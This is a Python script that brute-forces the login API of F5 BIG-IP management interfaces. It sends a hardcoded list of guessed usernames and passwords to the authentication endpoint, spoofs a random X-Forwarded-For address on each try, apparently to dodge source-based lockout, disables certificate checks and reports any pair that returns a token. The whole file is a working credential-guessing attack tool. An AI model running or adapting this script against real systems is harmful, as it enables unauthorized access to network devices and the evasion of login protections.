#!/usr/bin/env python
import requests
import collections
import sys
import argparse
import time
import random
parser = argparse.ArgumentParser(description="get variables")
parser.add_argument("x", type= str, default='10.128.10.44', help="bigip_mgmt_vip_ip")
parser.add_argument("y", type= str, default='admin', help="username")
parser.add_argument("z", type= str, default='admin', help="password")
args = parser.parse_args()

credDict = collections.OrderedDict()
requests.packages.urllib3.disable_warnings()
url = "https://" + args.x + "/mgmt/shared/authn/login"
credDict['superuser'] = 'superpass'
credDict['root'] = 'supedrpass'
credDict['f5'] = 'superpdadss'
credDict['boss'] = 'supsdferpass'
credDict['master'] = 'supedrsadfpass'
credDict['john'] = 'sasdffdsa'
credDict['yossi'] = 'supedrsadfpass'
credDict['aaron'] = 'sasdffdsa'
credDict['administrator'] = 'supderpass'
credDict[args.y] = args.z
for key, value in credDict.iteritems():
 ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
 payload = "{\n  \"username\": " + key +",\n  \"password\": " + value + ",\n  \"loginProvidername\":\"tmos\"\n}\n"
 headers = {
  'content-type': "application/json",
  'cache-control': "no-cache",
  'X-Forwarded-For': ip,
  }
 response = requests.request("POST", url, data=payload, headers=headers, verify=False)
 if "token" in response.text:
     print("Success, found valid credentials:" + "\nusername: " + key + " password: " + value)
 else:
  print("Authentication failed for user: " + key)
print("finished script")